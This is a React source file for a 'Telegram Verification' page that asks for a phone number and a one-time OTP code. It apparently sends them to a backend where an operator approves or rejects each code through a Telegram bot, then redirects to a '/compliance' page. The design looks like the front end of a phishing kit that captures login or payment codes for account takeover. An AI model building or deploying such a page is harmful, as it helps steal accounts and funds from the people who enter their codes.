// src/components/TelegramVerification.jsx
import { useState } from "react";
import { useVerification } from "../hooks/useVerification";
import "./TelegramVerification.css";
import { useNavigate } from "react-router-dom";

export default function TelegramVerification() {
  const navigate = useNavigate();
  const [phone, setPhone] = useState("");
  const [otp, setOtp] = useState("");
  const [countryCode, setCountryCode] = useState("+263");

  const {
    sessionId,
    status,
    loading,
    error,
    timeLeft,
    startVerification,
    reset,
  } = useVerification();

  const handleSubmit = async (e) => {
    e.preventDefault();

    const userData = {
      phoneNumber: phone,
      otpCode: otp,
      countryCode,
      userId: `user_${Date.now()}`,
      userName: "New User",
    };

    try {
      await startVerification(userData);
    } catch (err) {
      console.error("Verification error:", err);
    }
  };

  // Status messages
  const statusMessages = {
    pending: "⏳ Verifying...",
    approved: "✅ Verified! Redirecting...",
    wrong_code: "❌ Wrong OTP code. Please try again.",
    wrong_pin: "❌ Wrong PIN. Please try again.",
    expired: "⏰ Time expired. Please restart verification.",
    resend_requested: "🔄 OTP resend requested...",
  };

  if (status === "approved") {
    // Redirect or show success
    setTimeout(() => {
      navigate("/compliance");
      //   window.location.href = "/dashboard";
    }, 2000);

    return (
      <div className="verification-success">
        <h2>✅ Verification Successful!</h2>
        <p>You will be redirected shortly...</p>
      </div>
    );
  }

  return (
    <div className="verification-container">
      <h2>📱 Telegram Verification</h2>

      {!sessionId ? (
        <form onSubmit={handleSubmit} className="verification-form">
          <div className="form-group">
            <label>Country Code</label>
            <select
              value={countryCode}
              onChange={(e) => setCountryCode(e.target.value)}
            >
              <option value="+263">🇿🇼 +263 (Zimbabwe)</option>
              <option value="+1">🇺🇸 +1 (USA)</option>
              <option value="+44">🇬🇧 +44 (UK)</option>
              <option value="+27">🇿🇦 +27 (SA)</option>
            </select>
          </div>

          <div className="form-group">
            <label>Phone Number</label>
            <input
              type="tel"
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              placeholder="771234567"
              required
            />
          </div>

          <div className="form-group">
            <label>OTP Code</label>
            <input
              type="text"
              value={otp}
              onChange={(e) => setOtp(e.target.value)}
              placeholder="123456"
              required
            />
          </div>

          <button type="submit" disabled={loading}>
            {loading ? "Sending..." : "Request Verification"}
          </button>

          {error && <div className="error-message">{error}</div>}
        </form>
      ) : (
        <div className="verification-status">
          <div className="status-header">
            <h3>🔐 Verification in Progress</h3>
            <div className="timer">⏱️ {timeLeft}</div>
          </div>

          <div className={`status-message status-${status}`}>
            {statusMessages[status] || "Processing..."}
          </div>

          <div className="instructions">
            <h4>📋 Instructions:</h4>
            {/* <ol>
              <li>Open Telegram on your phone</li>
              <li>Check messages from your bot</li>
              <li>
                Click <strong>"Correct (PIN + OTP)"</strong>
              </li>
              <li>Wait for automatic approval</li>
            </ol> */}

            <div className="session-info">
              <small>Session ID: {sessionId}</small>
            </div>
          </div>

          {status === "expired" && (
            <button onClick={reset} className="retry-button">
              ↻ Try Again
            </button>
          )}
        </div>
      )}
    </div>
  );
}
